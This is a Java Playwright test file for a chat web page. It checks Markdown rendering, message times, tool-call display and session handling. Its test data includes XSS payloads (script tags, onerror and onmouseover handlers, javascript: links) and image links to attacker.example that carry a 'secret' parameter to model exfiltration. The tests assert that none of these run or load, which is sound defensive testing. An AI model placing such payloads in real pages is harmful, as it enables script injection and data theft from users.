package ai.javaclaw.chat;

import ai.javaclaw.agent.Agent;
import ai.javaclaw.agent.AgentEvent;
import ai.javaclaw.agent.AgentRequest;
import ai.javaclaw.agent.ChatSessions;
import ai.javaclaw.agent.ConversationKey;
import ai.javaclaw.agent.SessionChannel;
import ai.javaclaw.agent.SessionKind;
import ai.javaclaw.channels.ChannelRegistry;
import ai.javaclaw.chat.ws.ChatWebSocketHandler;
import ai.javaclaw.chat.ws.WebSocketConfig;
import com.microsoft.playwright.Browser;
import com.microsoft.playwright.BrowserType;
import com.microsoft.playwright.Page;
import com.microsoft.playwright.Playwright;
import com.microsoft.playwright.Route;
import com.microsoft.playwright.impl.driver.Driver;
import io.pebbletemplates.boot.autoconfigure.PebbleAutoConfiguration;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.ai.chat.messages.AssistantMessage;
import org.springframework.ai.chat.messages.Message;
import org.springframework.ai.chat.messages.ToolResponseMessage;
import org.springframework.ai.chat.messages.UserMessage;
import org.springframework.ai.session.InMemorySessionRepository;
import org.springframework.ai.session.Session;
import org.springframework.ai.session.SessionAttributes;
import org.springframework.ai.session.SessionEvent;
import org.springframework.ai.session.SessionService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.ImportAutoConfiguration;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.server.LocalServerPort;
import org.springframework.boot.tomcat.autoconfigure.servlet.TomcatServletWebServerAutoConfiguration;
import org.springframework.boot.webmvc.autoconfigure.DispatcherServletAutoConfiguration;
import org.springframework.boot.webmvc.autoconfigure.WebMvcAutoConfiguration;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Import;
import tools.jackson.databind.ObjectMapper;

import java.time.Instant;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.Consumer;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Runs the web chat page in headless Chromium against the real chat WebSocket handler, with an
 * agent that streams a fixed answer and keeps it in the web chat's active session (an in-memory
 * session store), to check the page's Markdown rendering — model output can never run script, and
 * a message renders the same streamed and loaded from history — and its chat sessions: new chat,
 * switching, renaming and searching. Pages run with a fixed locale and time zone (en-US, Asia/Tokyo: UTC+9, no
 * daylight saving) so message times can be checked exactly.
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT,
        classes = ChatMarkdownBrowserTest.TestConfig.class,
        properties = "pebble.suffix=.html.peb")
class ChatMarkdownBrowserTest {

    static final String MARKDOWN_ANSWER = """
            Here is **the plan** with `inline code`:

            - first item
            - second item with `chip`
            - compare `a < b && c` and "quotes"

            1. one
            2. two

            ```java
            record Point(int x, int y) {}
            if (a < b && c) { return "<ok>"; }
            ```

            Done: END-OF-ANSWER""";

    static final String XSS_ANSWER = """
            Before <img src=x onerror="window.__xss='img'"> middle
            <script>window.__xss='script'</script>
            [link](javascript:window.__xss='link') and <b onmouseover="window.__xss='b'">bold</b>

            <img src=x onerror=alert(1)>

            END-OF-ANSWER""";

    static final String IMAGE_ANSWER = """
            A chart: ![Q&A <chart>](https://attacker.example/md?d=secret "Sales") and a bare one ![](https://attacker.example/bare?d=secret)

            Raw: <img src="https://attacker.example/raw?d=secret" onerror="window.__xss='raw'">

            END-OF-ANSWER""";

    static final String HTML_TOOL_OUTPUT = "<script>window.__xss='output'</script><b onmouseover=\"window.__xss='b'\">bold</b>";

    static Playwright playwright;
    static Browser browser;

    @LocalServerPort
    int port;

    @Autowired
    TestConfig.FakeAgent agent;

    @Autowired
    SessionService sessions;

    @Autowired
    InMemorySessionRepository sessionRepository;

    @Autowired
    ChatSessions chatSessions;

    Page page;

    /** Every URL the page requested; anything not on this server is also blocked. */
    List<String> requests;

    /** Every response that was not a success, as "status url". */
    List<String> failedResponses;

    @BeforeAll
    static void startBrowser() throws Exception {
        // Install Chromium only (Playwright would otherwise fetch every browser it supports)
        Driver driver = Driver.ensureDriverInstalled(Map.of(), false);
        ProcessBuilder install = driver.createProcessBuilder();
        install.command().addAll(List.of("install", "chromium"));
        assertThat(install.inheritIO().start().waitFor()).as("playwright install chromium").isZero();

        playwright = Playwright.create(new Playwright.CreateOptions()
                .setEnv(Map.of("PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD", "1")));
        browser = playwright.chromium().launch(new BrowserType.LaunchOptions().setHeadless(true));
    }

    @AfterAll
    static void stopBrowser() {
        if (browser != null) browser.close();
        if (playwright != null) playwright.close();
    }

    @BeforeEach
    void openPage() {
        sessionRepository.findByMetadata(SessionAttributes.AGENT_NAME, "javaclaw").stream()
                .map(Session::id)
                .forEach(sessionRepository::delete);
        agent.reset();
        requests = new CopyOnWriteArrayList<>();
        failedResponses = new CopyOnWriteArrayList<>();
        page = newPage("en-US");
    }

    private Page newPage(String locale) {
        Page page = browser.newPage(new Browser.NewPageOptions().setLocale(locale).setTimezoneId("Asia/Tokyo"));
        page.onPageError(error -> System.out.println("[browser] page error: " + error));
        page.onConsoleMessage(message -> System.out.println("[browser] " + message.type() + ": " + message.text()));
        page.onRequest(request -> requests.add(request.url()));
        page.onResponse(response -> {
            if (response.status() >= 400) failedResponses.add(response.status() + " " + response.url());
        });
        page.route(url -> !url.startsWith("http://localhost:" + port + "/"), Route::abort);
        // Anything a payload manages to run is recorded here instead of opening a dialog
        page.addInitScript("window.__xss = null; window.alert = function (m) { window.__xss = 'alert:' + m; };");
        return page;
    }

    @AfterEach
    void closePage() {
        page.close();
    }

    @Test
    void rawHtmlInModelOutputRendersAsTextAndRunsNothing() {
        agent.answer = XSS_ANSWER;

        send("show me html");
        String streamedText = lastAgentText();
        assertNothingRan();

        page.reload();
        waitForAnswer();
        assertNothingRan();

        assertThat(streamedText)
                .contains("<img src=x onerror=\"window.__xss='img'\">")
                .contains("<script>window.__xss='script'</script>")
                .contains("<img src=x onerror=alert(1)>");
        assertThat(lastAgentText()).isEqualTo(streamedText);
    }

    @Test
    void imagesInModelOutputAreLinksAndAreNeverLoaded() {
        agent.answer = IMAGE_ANSWER;

        send("show me a chart");
        assertImagesAreLinksAndNothingLoaded();

        page.reload();
        waitForAnswer();
        assertImagesAreLinksAndNothingLoaded();
    }

    private void assertImagesAreLinksAndNothingLoaded() {
        assertNothingRan();
        // (the mascot in each message header is the page's own image; message bodies have none)
        assertThat(page.locator(".ar-msg__body :is(img, picture, source, video, audio, track, iframe, object, embed)").count())
                .isZero();

        // Markdown images become ordinary links, labelled with the alt text or else the URL
        @SuppressWarnings("unchecked")
        List<Map<String, String>> links = (List<Map<String, String>>) page.evaluate("""
                () => [...[...document.querySelectorAll('#chat-messages .ar-msg--agent .ar-md')].pop().querySelectorAll('a')]
                    .map(a => ({text: a.textContent, href: a.getAttribute('href'), target: a.getAttribute('target'),
                                rel: a.getAttribute('rel'), title: a.getAttribute('title') || ''}))""");
        assertThat(links).containsExactly(
                Map.of("text", "Q&A <chart>", "href", "https://attacker.example/md?d=secret",
                        "target", "_blank", "rel", "noopener noreferrer", "title", "Sales"),
                Map.of("text", "https://attacker.example/bare?d=secret", "href", "https://attacker.example/bare?d=secret",
                        "target", "_blank", "rel", "noopener noreferrer", "title", ""));

        // The raw tag is shown as text
        assertThat(lastAgentText()).contains("<img src=\"https://attacker.example/raw?d=secret\" onerror=\"window.__xss='raw'\">");

        // Nothing was requested from the image host, or from anywhere but this server
        assertThat(requests).noneMatch(url -> url.contains("attacker.example"));
        assertThat(requests).isNotEmpty().allMatch(url -> url.startsWith("http://localhost:" + port + "/"));
        // and everything the page needs (Bulma, htmx, its ws extension, fonts, scripts) was served
        assertThat(requests).anyMatch(url -> url.endsWith("/webjars/bulma/css/bulma.min.css"))
                .anyMatch(url -> url.endsWith("/webjars/htmx.org/dist/htmx.min.js"))
                .anyMatch(url -> url.endsWith("/webjars/htmx-ext-ws/ws.js"));
        assertThat(failedResponses).isEmpty();
    }

    @Test
    void streamedAndHistoryMessagesRenderTheSame() {
        agent.answer = MARKDOWN_ANSWER;

        send("plan please");
        String streamed = lastAgentBodyHtml();

        page.reload();
        waitForAnswer();
        String fromHistory = lastAgentBodyHtml();

        assertThat(streamed)
                .contains("<strong>the plan</strong>")
                .contains("<code>inline code</code>")
                .contains("<li>second item with <code>chip</code></li>")
                .contains("<ol>")
                .contains("<span class=\"ar-code__lang\">java</span>")
                .contains("<code>a &lt; b &amp;&amp; c</code>")
                .contains("<pre><code>record Point(int x, int y) {}")
                .contains("if (a &lt; b &amp;&amp; c) { return \"&lt;ok&gt;\"; }");
        assertThat(fromHistory).isEqualTo(streamed);
    }

    @Test
    void liveAndHistoryMessagesShowTheirTimeTheSameWay() {
        agent.answer = "Hi END-OF-ANSWER";

        send("what time is it");
        List<String> live = messageTimes();

        page.reload();
        waitForAnswer();
        List<String> fromHistory = messageTimes();

        // user time, then agent time; each "h:mm AM" today, with the full date in the title
        assertThat(live).hasSize(2).allMatch(text -> text.matches("\\d{1,2}:\\d{2} [AP]M"));
        assertThat(fromHistory).isEqualTo(live);
        assertThat(timeAttribute(".ar-msg--agent", "title")).matches("\\w+day, \\w+ \\d{1,2}, \\d{4} at .*");
    }

    @Test
    void aMessageFromHistoryShowsItsStoredTimeInTheBrowsersTimeZone() {
        remember(new UserMessage("Old question"), Instant.parse("2024-03-05T10:42:05Z"));
        remember(new AssistantMessage("Old answer END-OF-ANSWER"), Instant.parse("2024-03-05T10:43:59Z"));

        page.navigate("http://localhost:" + port + "/chat");
        waitForAnswer();

        assertThat(timeAttribute(".ar-msg--user", "datetime")).isEqualTo("2024-03-05T10:42:05Z");
        assertThat(timeAttribute(".ar-msg--agent", "datetime")).isEqualTo("2024-03-05T10:43:59Z");
        // 10:42 UTC is 19:42 in Tokyo; 2024 is an earlier year, so the year is shown
        assertThat(messageTimes()).containsExactly("Mar 5, 2024, 7:42 PM", "Mar 5, 2024, 7:43 PM");
        assertThat(timeAttribute(".ar-msg--user", "title")).isEqualTo("Tuesday, March 5, 2024 at 7:42:05 PM");
    }

    @Test
    void timesReadAsTodayYesterdayOrDateInTheBrowsersLocale() {
        page.navigate("http://localhost:" + port + "/chat");
        page.waitForSelector("#chat-title");
        // Just after midnight, so "yesterday" is minutes ago and "today" is not "the last 24 hours"
        String now = "new Date(2026, 10, 21, 0, 30)";

        assertThat(formatTime(page, "new Date(2026, 10, 21, 0, 5)", now)).isEqualTo("12:05 AM");
        assertThat(formatTime(page, "new Date(2026, 10, 20, 23, 50)", now)).isEqualTo("Yesterday 11:50 PM");
        assertThat(formatTime(page, "new Date(2026, 10, 20, 0, 1)", now)).isEqualTo("Yesterday 12:01 AM");
        assertThat(formatTime(page, "new Date(2026, 10, 19, 23, 59)", now)).isEqualTo("Nov 19, 11:59 PM");
        assertThat(formatTime(page, "new Date(2026, 0, 1, 0, 0)", now)).isEqualTo("Jan 1, 12:00 AM");
        // An earlier year shows the year, even when it is only days ago
        assertThat(formatTime(page, "new Date(2025, 10, 14, 11, 42)", now)).isEqualTo("Nov 14, 2025, 11:42 AM");
        assertThat(formatTime(page, "new Date(2025, 11, 30, 9, 15)", "new Date(2026, 0, 2, 8, 0)"))
                .isEqualTo("Dec 30, 2025, 9:15 AM");

        Page german = newPage("de-DE");
        try {
            german.navigate("http://localhost:" + port + "/chat");
            german.waitForSelector("#chat-title");
            assertThat(formatTime(german, "new Date(2026, 10, 21, 11, 42)", now)).isEqualTo("11:42");
            assertThat(formatTime(german, "new Date(2026, 10, 20, 11, 42)", now)).isEqualTo("Gestern 11:42");
        } finally {
            german.close();
        }
    }

    @Test
    void toolCallsLookTheSameLiveAndAfterAReload() {
        agent.toolEvents = List.of(
                new AgentEvent.ToolCall("call-1", "weather", "{\"city\":\"Paris\"}"),
                new AgentEvent.ToolResult("call-1", "weather", "\"sunny\""),
                new AgentEvent.Token("Paris is sunny. "),
                // A round with two calls, answered in another order
                new AgentEvent.ToolCall("call-2", "weather", "{\"city\":\"Rome\"}"),
                new AgentEvent.ToolCall("call-3", "clock", "{\"city\":\"Rome\",\"format\":\"24h\"}"),
                new AgentEvent.ToolResult("call-3", "clock", "{\"time\":\"10:42\"}"),
                new AgentEvent.ToolResult("call-2", "weather", "\"rainy\""),
                // Never answered
                new AgentEvent.ToolCall("call-4", "notify", "{\"to\":\"me\"}"));
        agent.answer = "Rome is rainy. END-OF-ANSWER";

        send("weather in Paris and Rome?");
        List<Map<String, Object>> live = toolRows();
        String liveTitle = (String) page.evaluate("() => document.querySelector('.ar-tools__title').textContent");

        page.reload();
        waitForAnswer();
        List<Map<String, Object>> fromHistory = toolRows();

        assertThat(live).extracting(row -> row.get("name")).containsExactly("weather", "weather", "clock", "notify");
        assertThat(live.get(2)).containsEntry("args", "Rome +1")
                .containsEntry("input", "{\n  \"city\": \"Rome\",\n  \"format\": \"24h\"\n}")
                .containsEntry("output", "{\n  \"time\": \"10:42\"\n}")
                .containsEntry("state", "done");
        assertThat(live.get(1)).containsEntry("output", "rainy");
        assertThat(live.get(3)).containsEntry("state", "unanswered no result").containsEntry("outputShown", false);
        assertThat(fromHistory).isEqualTo(live);

        // One agent message per turn, with one tool group on top and the turn's text below it
        assertThat(page.locator("#chat-messages .ar-msg--agent").count()).isEqualTo(1);
        assertThat(page.locator("#chat-messages .ar-tools").count()).isEqualTo(1);
        assertThat(page.evaluate("() => document.querySelector('.ar-msg--agent .ar-msg__body').firstElementChild.className"))
                .isEqualTo("ar-tools");
        assertThat(page.evaluate("() => document.querySelector('.ar-tools__title').textContent")).isEqualTo(liveTitle)
                .isEqualTo("Used 4 tools");
        assertThat((String) page.evaluate("() => document.querySelector('.ar-msg--agent .ar-msg__body').textContent"))
                .contains("Paris is sunny.").contains("Rome is rainy. END-OF-ANSWER");
        // Times come from the stored call and result times
        assertThat((String) page.evaluate("() => document.querySelectorAll('.ar-tool__time')[0].textContent"))
                .matches("\\d+ms|\\d+(\\.\\d)?s");

        // A row opens to show its input and output
        page.locator(".ar-tool__row").nth(2).click();
        assertThat(page.locator(".ar-tool__detail").nth(2).isVisible()).isTrue();
        assertThat(page.locator(".ar-tool__input").nth(2).innerText()).contains("\"format\": \"24h\"");
        assertThat(page.locator(".ar-tool__output").nth(2).innerText()).contains("\"time\": \"10:42\"");
    }

    @Test
    void htmlInToolArgumentsAndResultsRendersAsText() {
        String input = "{\"html\":\"<img src=x onerror=\\\"window.__xss='input'\\\">\"}";
        agent.toolEvents = List.of(
                new AgentEvent.ToolCall("call-1", "fetch", input),
                new AgentEvent.ToolResult("call-1", "fetch", HTML_TOOL_OUTPUT));
        agent.answer = "Fetched. END-OF-ANSWER";

        send("fetch it");
        assertToolHtmlIsText();

        page.reload();
        waitForAnswer();
        assertToolHtmlIsText();
    }

    private void assertToolHtmlIsText() {
        assertNothingRan();
        assertThat(page.locator(".ar-tools :is(img, script, b)").count()).isZero();
        assertThat(toolRows()).singleElement().satisfies(row -> {
            assertThat(row.get("args")).isEqualTo("<img src=x onerror=\"window.__xss='input'\">");
            assertThat(row.get("input")).isEqualTo("{\n  \"html\": \"<img src=x onerror=\\\"window.__xss='input'\\\">\"\n}");
            assertThat(row.get("output")).isEqualTo(HTML_TOOL_OUTPUT);
        });
    }

    /**
     * The tool rows of the last agent message as a person sees them: name, collapsed hint, input,
     * output, whether the output shows, and the state. A finished row's time depends on when it ran,
     * so it is left out; an unfinished row's label is part of its state.
     */
    @SuppressWarnings("unchecked")
    private List<Map<String, Object>> toolRows() {
        return (List<Map<String, Object>>) page.evaluate("""
                () => [...[...document.querySelectorAll('#chat-messages .ar-msg--agent')].pop().querySelectorAll('.ar-tool')]
                    .map(el => ({
                        name: el.querySelector('.ar-tool__name').textContent,
                        args: el.querySelector('.ar-tool__args').textContent,
                        input: el.querySelector('.ar-tool__input').textContent,
                        output: el.querySelector('.ar-tool__output').textContent,
                        outputShown: !el.querySelector('.ar-tool__output-section').hidden,
                        state: el.classList.contains('ar-tool--done') ? 'done'
                            : ['unanswered', 'failed'].filter(s => el.classList.contains('ar-tool--' + s)).join(' ')
                              + ' ' + el.querySelector('.ar-tool__time').textContent
                    }))""");
    }

    // --- Chat sessions ----------------------------------------------------------------------

    @Test
    void aNewChatStartsEmptyAndSwitchingBackLoadsTheEarlierSessionsHistory() {
        agent.answer = "First answer END-OF-ANSWER";
        send("first question");
        assertThat(title()).isEqualTo("New chat");

        page.click("#new-chat");
        page.waitForFunction("() => document.querySelectorAll('#chat-list li').length === 2");
        assertThat(page.textContent("#chat-messages")).contains("How can I help you today?").doesNotContain("first question");

        agent.answer = "Second answer END-OF-ANSWER";
        say("second question");

        // Latest activity first: the session just used is on top, the first one below it
        page.click("#chat-list li:nth-child(2) button");
        page.waitForFunction("() => document.getElementById('chat-messages').textContent.includes('first question')");
        assertThat(page.textContent("#chat-messages")).doesNotContain("second question");
        assertThat(page.locator("#chat-list .is-active").count()).isOne();

        // The switch is the server's: a reload shows the same session
        page.reload();
        page.waitForFunction("() => document.getElementById('chat-messages').textContent.includes('first question')");
    }

    @Test
    void renamingUpdatesTheHeaderAndTheSidebar() {
        open();

        page.click("#rename-btn");
        assertThat(page.isVisible("#rename-input")).isTrue();
        assertThat(page.isVisible("#chat-title")).isFalse();
        page.fill("#rename-input", "Trip to Lisbon");
        page.click(".ar-rename__button--save");

        page.waitForFunction("() => document.getElementById('chat-title').textContent === 'Trip to Lisbon'");
        assertThat(page.isVisible("#chat-title")).isTrue();
        assertThat(page.textContent("#chat-list .is-active .ar-side__title")).isEqualTo("Trip to Lisbon");
    }

    @Test
    void cancellingARenameKeepsTheTitle() {
        chatSessions.create(ConversationKey.web(), SessionKind.CHAT, SessionChannel.WEB, "Groceries");
        open();

        page.click("#rename-btn");
        page.fill("#rename-input", "Something else");
        page.click("#rename-cancel");

        assertThat(page.isVisible("#chat-title")).isTrue();
        assertThat(page.isVisible("#rename-input")).isFalse();
        assertThat(title()).isEqualTo("Groceries");
    }

    @Test
    void searchFiltersTheChatsByTitle() {
        chatSessions.create(ConversationKey.web(), SessionKind.CHAT, SessionChannel.WEB, "Groceries");
        chatSessions.create(ConversationKey.web(), SessionKind.CHAT, SessionChannel.WEB, "Trip to Lisbon");
        chatSessions.create(ConversationKey.web(), SessionKind.CHAT, SessionChannel.WEB, "Lisbon restaurants");
        open();
        assertThat(visibleChats()).hasSize(3);

        page.fill("#chat-search", "lisbon");
        assertThat(visibleChats()).containsExactlyInAnyOrder("Trip to Lisbon", "Lisbon restaurants");
        assertThat(page.isVisible("#chat-list-empty")).isFalse();

        page.fill("#chat-search", "zebra");
        assertThat(visibleChats()).isEmpty();
        assertThat(page.isVisible("#chat-list-empty")).isTrue();
        assertThat(page.textContent("#chat-list-empty")).isEqualTo("No chats match.");

        page.fill("#chat-search", "");
        assertThat(visibleChats()).hasSize(3);
    }

    @Test
    void newTypedInTheChatStartsANamedSessionWithoutAskingTheAgent() {
        agent.answer = "First answer END-OF-ANSWER";
        send("first question");

        page.fill("#message-input", "/new Holiday");
        page.click("#send-btn");

        page.waitForFunction("() => document.getElementById('chat-title').textContent === 'Holiday'");
        assertThat(page.textContent("#chat-messages")).contains("Started a new conversation.").doesNotContain("/new");
        assertThat(agent.calls).hasValue(1);
        assertThat(visibleChats()).contains("Holiday");
    }

    // --- Several tabs and stream frames ----------------------------------------------------

    static final String HELD_ANSWER = "Partly sunny. The rest of the answer END-OF-ANSWER";

    @Test
    void twoTabsOnDifferentSessionsEachSendToTheSessionTheyShow() throws Exception {
        String other = chatSessions.create(ConversationKey.web(), SessionKind.CHAT, SessionChannel.WEB, "Other");
        String main = chatSessions.create(ConversationKey.web(), SessionKind.CHAT, SessionChannel.WEB, "Main");
        Page second = newPage("en-US");
        try {
            open(page);
            open(second);
            clickChat(second, "Other");

            agent.answer = "Main answer END-OF-ANSWER";
            say("for main");
            agent.finished = new CountDownLatch(1);
            agent.answer = "Other answer END-OF-ANSWER";
            say(second, "for other");

            assertThat(sessions.getMessages(main)).extracting(Message::getText).containsExactly("for main", "Main answer END-OF-ANSWER");
            assertThat(sessions.getMessages(other)).extracting(Message::getText).containsExactly("for other", "Other answer END-OF-ANSWER");
            assertThat(page.textContent("#chat-messages")).doesNotContain("Other answer");
            assertThat(second.textContent("#chat-messages")).doesNotContain("Main answer");
        } finally {
            second.close();
        }
    }

    @Test
    void anAnswerThatStreamsWhileTheTabSwitchesSessionStaysInItsOwnSession() throws Exception {
        givenMainAndOther();
        startHeldAnswer();

        clickChat(page, "Other");
        page.waitForFunction("() => document.getElementById('chat-title').textContent === 'Other'");
        finishHeldAnswer();

        assertNothingOfTheAnswerIsShown(page);
        clickChat(page, "Main");
        assertTheFullAnswerIsShown();
    }

    @Test
    void anAnswerThatStreamsWhileTheTabStartsANewChatStaysInItsOwnSession() throws Exception {
        givenMainAndOther();
        startHeldAnswer();

        page.fill("#message-input", "/new");
        page.click("#send-btn");
        page.waitForFunction("() => document.getElementById('chat-messages').textContent.includes('Started a new conversation.')");
        finishHeldAnswer();

        assertNothingOfTheAnswerIsShown(page);
        clickChat(page, "Main");
        assertTheFullAnswerIsShown();
    }

    @Test
    void anAnswerThatStreamsWhileTheTabOpensAChannelStaysInItsOwnSession() throws Exception {
        String telegram = chatSessions.create(ConversationKey.telegram(42, null), SessionKind.CHAT, SessionChannel.TELEGRAM, "Weather");
        sessions.appendMessage(telegram, new UserMessage("Rain tomorrow?"));
        givenMainAndOther();
        startHeldAnswer();

        page.click("#chat-sessions button[hx-vals*='viewSession']");
        page.waitForFunction("() => document.getElementById('chat-title').textContent === 'Weather'");
        finishHeldAnswer();

        assertNothingOfTheAnswerIsShown(page);
        assertThat(page.textContent("#chat-messages")).contains("Rain tomorrow?");
        clickChat(page, "Main");
        assertTheFullAnswerIsShown();
    }

    @Test
    void aSecondTabShowingAnotherSessionReceivesNoneOfTheStream() throws Exception {
        givenMainAndOther();
        Page second = newPage("en-US");
        try {
            open(second);
            clickChat(second, "Other");

            startHeldAnswer();
            finishHeldAnswer();
            waitForAnswer();

            assertNothingOfTheAnswerIsShown(second);
            assertThat(lastAgentText().strip()).isEqualTo(HELD_ANSWER);
        } finally {
            second.close();
        }
    }

    /** Two web chats, "Other" and then "Main", which is active; the page shows Main. */
    private void givenMainAndOther() {
        chatSessions.create(ConversationKey.web(), SessionKind.CHAT, SessionChannel.WEB, "Other");
        chatSessions.create(ConversationKey.web(), SessionKind.CHAT, SessionChannel.WEB, "Main");
        open();
        assertThat(title()).isEqualTo("Main");
    }

    /** Sends a question whose answer stops after its first chunk until {@link #finishHeldAnswer()}. */
    private void startHeldAnswer() {
        agent.answer = HELD_ANSWER;
        agent.hold = new CountDownLatch(1);
        page.fill("#message-input", "weather?");
        page.click("#send-btn");
        page.waitForFunction("() => [...document.querySelectorAll('#chat-messages .ar-msg--agent .ar-md')]"
                + ".some(md => md.textContent.startsWith('Par'))");
    }

    /** Lets the held answer finish, and gives any stray frame time to arrive. */
    private void finishHeldAnswer() throws InterruptedException {
        agent.hold.countDown();
        assertThat(agent.finished.await(10, TimeUnit.SECONDS)).as("answer finished").isTrue();
        page.waitForTimeout(300);
    }

    private static void assertNothingOfTheAnswerIsShown(Page page) {
        assertThat(page.textContent("#chat-messages")).doesNotContain("Partly").doesNotContain("rest of the answer")
                .doesNotContain("END-OF-ANSWER");
        assertThat(page.innerHTML("#typing-indicator")).isEmpty();
    }

    private void assertTheFullAnswerIsShown() {
        page.waitForFunction("() => document.getElementById('chat-title').textContent === 'Main'");
        waitForAnswer();
        assertThat(lastAgentText().strip()).isEqualTo(HELD_ANSWER);
        assertThat(page.locator("#chat-messages .ar-msg--agent .ar-md").allTextContents())
                .filteredOn(text -> text.contains("Par")).hasSize(1);
    }

    private static void clickChat(Page page, String title) {
        page.click("#chat-list button:has(.ar-side__title:text-is('" + title + "'))");
        page.waitForFunction("t => document.getElementById('chat-title').textContent === t", title);
    }

    /** JavaClawTime.format in the page; Intl's narrow no-break spaces are read as spaces. */
    private static String formatTime(Page page, String date, String now) {
        String text = (String) page.evaluate("() => JavaClawTime.format(" + date + ", " + now + ")");
        return text.replace('\u202F', ' ').replace('\u00A0', ' ');
    }

    /** The shown time of every message, in order. */
    private List<String> messageTimes() {
        @SuppressWarnings("unchecked")
        List<String> texts = (List<String>) page.evaluate(
                "() => [...document.querySelectorAll('#chat-messages .ar-msg__time')].map(t => t.textContent)");
        return texts.stream().map(text -> text.replace('\u202F', ' ').replace('\u00A0', ' ')).toList();
    }

    /** An attribute of the last message time of the given kind of message. */
    private String timeAttribute(String messageSelector, String attribute) {
        String value = (String) page.evaluate("([selector, attribute]) => [...document.querySelectorAll("
                + "'#chat-messages ' + selector + ' .ar-msg__time')].pop().getAttribute(attribute)",
                List.of(messageSelector, attribute));
        return value.replace('\u202F', ' ').replace('\u00A0', ' ');
    }

    private void send(String message) {
        open();
        say(message);
    }

    private void open() {
        open(page);
    }

    private void open(Page page) {
        page.navigate("http://localhost:" + port + "/chat");
        // On connect the server swaps in the header and a fresh input area in one frame; text typed
        // into the page's initial textarea before that swap would be thrown away.
        page.waitForSelector("#chat-title");
        page.waitForSelector("#message-input:not([disabled])");
    }

    /** Sends a message in the open page and waits for the whole answer. */
    private void say(String message) {
        say(page, message);
    }

    private void say(Page page, String message) {
        page.fill("#message-input", message);
        page.click("#send-btn");
        waitForAnswer(page);
    }

    /** Stores a message in the web chat's active session, as if it had been sent at {@code time}. */
    private void remember(Message message, Instant time) {
        String sessionId = chatSessions.active(ConversationKey.web(), SessionKind.CHAT, SessionChannel.WEB);
        sessions.appendEvent(SessionEvent.builder().sessionId(sessionId).timestamp(time).message(message).build());
    }

    private String title() {
        return page.textContent("#chat-title");
    }

    /** The titles of the chats the search leaves visible. */
    @SuppressWarnings("unchecked")
    private List<String> visibleChats() {
        return (List<String>) page.evaluate("() => [...document.querySelectorAll('#chat-list li')]"
                + ".filter(li => !li.hidden).map(li => li.querySelector('.ar-side__title').textContent)");
    }

    /** The answer is complete once its last line is rendered and the typing indicator is gone. */
    private void waitForAnswer() {
        waitForAnswer(page);
    }

    private static void waitForAnswer(Page page) {
        try {
            awaitAnswer(page);
        } catch (com.microsoft.playwright.TimeoutError e) {
            System.out.println("[browser] chat at timeout: " + page.innerHTML("#chat-messages"));
            System.out.println("[browser] typing indicator: " + page.innerHTML("#typing-indicator"));
            throw e;
        }
    }

    private static void awaitAnswer(Page page) {
        page.waitForFunction("""
                () => {
                    const md = [...document.querySelectorAll('#chat-messages .ar-msg--agent .ar-md')].pop();
                    return md && !md.hasAttribute('data-md') && md.textContent.includes('END-OF-ANSWER')
                        && document.getElementById('typing-indicator').children.length === 0;
                }""");
    }

    private String lastAgentBodyHtml() {
        return (String) page.evaluate(
                "() => [...document.querySelectorAll('#chat-messages .ar-msg--agent .ar-msg__body')].pop().innerHTML");
    }

    private String lastAgentText() {
        return (String) page.evaluate(
                "() => [...document.querySelectorAll('#chat-messages .ar-msg--agent .ar-md')].pop().textContent");
    }

    private void assertNothingRan() {
        // Give event handlers (onerror on a broken image, say) the chance to fire
        page.waitForTimeout(300);
        assertThat(page.evaluate("() => window.__xss")).as("script run by model output").isNull();
        assertThat(page.locator("#chat-messages .ar-md img").count()).isZero();
        assertThat(page.locator("#chat-messages script").count()).isZero();
        assertThat(page.locator("#chat-messages [onerror], #chat-messages [onmouseover]").count()).isZero();
        assertThat(page.locator("#chat-messages a[href^='javascript']").count()).isZero();
    }

    @Configuration(proxyBeanMethods = false)
    @ImportAutoConfiguration({TomcatServletWebServerAutoConfiguration.class,
            DispatcherServletAutoConfiguration.class, WebMvcAutoConfiguration.class, PebbleAutoConfiguration.class})
    @Import({WebSocketConfig.class, ChatWebSocketHandler.class, ChatChannel.class, ChatController.class,
            InMemoryChatSessions.class})
    static class TestConfig {

        @Bean
        ObjectMapper objectMapper() {
            return new ObjectMapper();
        }

        @Bean
        ChannelRegistry channelRegistry() {
            return new ChannelRegistry();
        }

        @Bean
        FakeAgent agent(SessionService sessions, ChatSessions chatSessions) {
            return new FakeAgent(sessions, chatSessions);
        }

        /**
         * Streams {@link #toolEvents}, then {@link #answer} in small chunks that split words and
         * Markdown syntax, and keeps the turn in the conversation's active session the way session
         * memory stores it: each tool call and each result as it happens, the text of the tool
         * rounds, and the answer.
         */
        static class FakeAgent implements Agent {

            private final SessionService sessions;
            private final ChatSessions chatSessions;
            final AtomicInteger calls = new AtomicInteger();
            volatile List<AgentEvent> toolEvents = List.of();
            volatile String answer = "";
            /** When set, the answer waits after its first chunk until this is counted down. */
            volatile CountDownLatch hold;
            /** Counted down once an answer is complete and stored. */
            volatile CountDownLatch finished = new CountDownLatch(1);

            FakeAgent(SessionService sessions, ChatSessions chatSessions) {
                this.sessions = sessions;
                this.chatSessions = chatSessions;
            }

            void reset() {
                calls.set(0);
                toolEvents = List.of();
                hold = null;
                finished = new CountDownLatch(1);
            }

            @Override
            public String respondTo(AgentRequest request) {
                return answer;
            }

            @Override
            public void respondTo(AgentRequest request, Consumer<AgentEvent> events) {
                calls.incrementAndGet();
                String sessionId = request.sessionId() != null
                        ? request.sessionId()
                        : chatSessions.active(request.conversation(), request.kind(), request.channel());
                sessions.appendMessage(sessionId, new UserMessage(request.input()));
                for (AgentEvent event : toolEvents) {
                    switch (event) {
                        case AgentEvent.ToolCall c -> sessions.appendMessage(sessionId, AssistantMessage.builder()
                                .content("")
                                .toolCalls(List.of(new AssistantMessage.ToolCall(c.id(), "function", c.name(), c.input())))
                                .build());
